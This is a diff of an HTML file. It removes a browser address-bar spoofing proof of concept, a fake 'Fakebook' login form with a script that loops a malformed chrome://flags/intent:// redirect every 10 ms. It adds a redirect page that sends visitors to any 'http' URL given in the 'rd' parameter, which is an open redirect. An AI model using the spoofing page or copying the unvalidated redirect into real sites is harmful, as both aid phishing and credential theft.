@@ -1,14 +1,23 @@
+<!DOCTYPE html>
 <html>
-<title>Address Bar spoofing Brave</title>
-<h1> This is Fakebook </h1>
-<form>
-Email: <input type="text" name="username" placeholder="add email"><br>
-Password: <input type="text" name="password" placeholder="pass">
-<script>
-function f()
-{
-location = "https://chrome://flags/intent://vtp.operagx.gg/?url=google.com"
-}
-setInterval("f()", 10);
-</script>
+<head>
+  <title>Redirecting...</title>
+  <meta charset="UTF-8">
+  <script>
+    window.onload = function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      const redirectTo = urlParams.get('rd');
+
+      // Basic validation to avoid javascript: URLs or null values
+      if (redirectTo && redirectTo.startsWith("http")) {
+        window.location.href = redirectTo;
+      } else {
+        document.body.innerHTML = "<h2>Invalid or missing redirect URL.</h2>";
+      }
+    };
+  </script>
+</head>
+<body>
+  <p>Redirecting... If nothing happens, <a id="manual" href="#">click here</a>.</p>
+</body>
 </html>
